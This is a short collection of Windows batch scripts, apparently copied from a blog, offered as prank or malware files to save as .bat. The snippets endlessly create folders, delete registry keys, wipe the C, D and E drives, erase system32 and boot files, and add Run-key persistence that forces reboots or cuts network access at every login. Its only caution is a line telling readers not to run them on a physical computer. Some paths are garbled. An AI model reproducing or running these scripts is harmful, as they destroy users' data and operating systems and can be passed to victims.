Copy each section into a new notepad file and save it as .bat
DON'T RUN THEM ON YOUR PHYSICAL COMPUTER
---------------------------------------------------
@echo off
:VIRUS
cd /d C:
md %RANDOM%
cd /d D:
md %RANDOM%
goto VIRUS
REM ###################
REM errorcode401.blogspot.in

(renaming folders and files as random number)
---------------------------------------------------

@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*

(delete registry files)
--------------------------------------

@echo off
Ipconfig/release

(disable internet)
----------------------------------------

rd/s/q D:/
rd/s/q C:/
rd/s/q E:/

(format the computer)
-------------------------------------------------

echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c.windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
echo gg
PAUSE

(constantly shuting down the computer)
-----------------------------------------------------

del c:\WINDOWS\system32\*.*/q

(delete Windows OS)
-------------------------------------------------------
echo @echo off>c: windowswimn32.bat
echo break off>>c: windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo no more internet
PAUSE

(permanentlydisable internet)


-------------------------------------------------------

@echo off
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini

(deletes the c drive)
